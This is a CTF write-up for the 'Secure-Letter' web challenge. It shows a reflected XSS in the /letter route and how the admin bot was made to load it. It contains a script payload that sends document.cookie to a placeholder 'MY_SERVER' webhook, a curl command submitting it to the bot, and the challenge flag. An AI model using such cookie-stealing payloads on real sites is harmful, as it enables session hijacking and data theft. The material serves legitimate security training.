# Secure-Letter — QnQSec CTF 2025

> **Room / Challenge:** Secure-Letter (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** QnQSec CTF 2025
- **Challenge:** Secure-Letter (web)
- **Target / URL:** `http://161.97.155.116:3001/`
- **Points:** `50`
- **Date:** `20-10-2025`

---

## Goal

We have to get the flag by using XSS to get the flag from bot.

## My Solution

This solution is written after the server has beed shut down, so I will use my mind. First let's examine the [source code](./secure-letter.7z), there is a route that we can use to inject Javascript code (XSS): `/letter` route

```javascript
app.get("/letter", (req, res) => {
  const content = req.query.content || "Write your letter here...";

  const letterHtml = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Your Letter</title>
    <style>
        body {
            font-family: 'Times New Roman', serif;
            margin: 0;
            padding: 40px;
            background: linear-gradient(to bottom right, #fef3c7, #fde68a);
            min-height: 100vh;
        }
        .letter-container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            border: 1px solid #e5e7eb;
        }
        .letter-header {
            text-align: center;
            margin-bottom: 30px;
            border-bottom: 2px solid #d1d5db;
            padding-bottom: 20px;
        }
        .letter-content {
            line-height: 1.8;
            font-size: 16px;
            color: #374151;
            white-space: pre-wrap;
        }
        .letter-signature {
            margin-top: 30px;
            text-align: right;
        }
    </style>
</head>
<body>
    <div class="letter-container">
        <div class="letter-header">
            <h2>📮 Personal Letter</h2>
        </div>
        <div class="letter-content">${content}</div>
        <div class="letter-signature">
            <p><em>Written with love ❤️</em></p>
        </div>
    </div>
</body>
</html>`;

  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.end(letterHtml);
});
```

The `content` value from query param is rendered into the page so we can inject Javascript to get the flag from bot cookie:

```javascript
const BOT_CONFIG = {
  baseUrl: process.env.WEB_URL || "http://localhost:3001",
  cookieName: "flag",
  cookieValue: process.env.FLAG || "FLAG{test_flag}",
};
```

I use this javascript code to get the cookie:

```javascript
fetch(`https://MY_SERVER/webhook?c=${document.cookie}`);
```

However the bot set the cookie to the domain `process.env.COOKIE_DOMAIN` or `localhost`:

```javascript
await page.setCookie({
  name: BOT_CONFIG.cookieName,
  value: BOT_CONFIG.cookieValue,
  domain: process.env.COOKIE_DOMAIN || "localhost",
  path: "/",
  httpOnly: false,
  secure: false,
});
```

So we have to use `http://web:3001/letter?content=<OUR_SCRIPT>`. The final exploit `curl` code (I encoded script to prevent error):

```bash
curl -v -X POST 'http://161.97.155.116:3001/api/report' \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://web:3001/letter?content=%3Cscript%3Efetch(%60https://MY_SERVER/webhook?c=%24%7Bdocument.cookie%7D%60)%3C/script%3E"}'
```

Result:
![Guide image](./screenshots/1.png)

Flag: `QnQSec{bf_c4ch3_0ff_clobbering_on}`
